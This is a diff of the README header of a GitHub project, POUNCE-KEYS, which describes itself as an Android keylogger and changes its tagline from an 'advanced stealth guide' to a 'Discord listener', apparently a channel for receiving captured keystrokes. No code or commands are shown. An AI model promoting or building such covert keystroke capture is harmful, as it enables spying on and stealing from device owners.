@@ -9,16 +9,13 @@
 <!-- PROJECT LOGO -->
 <br />
 <div align="center">
-  <a href="https://github.com/NullPounce/pounce-keys">
-    <img src="images/logo.png" alt="Logo" width="150" height="150">
-  </a>
 <a href="https://www.nullpounce.com/">                                                  
     <img src="https://www.nullpounce.com/assets/demo.gif">
   </a>
   <h3 align="center">POUNCE-KEYS</h3>
 
   <p align="center">
-    Custom Java listener [ Keylogger for Android ] 🐱‍⌨️ + advanced stealth guide
+    Custom Java listener [ Keylogger for Android ] 🐱‍⌨️ + Discord listener
     <br />
     <a href="https://github.com/NullPounce/pounce-keys/releases">View Release</a>
     ·
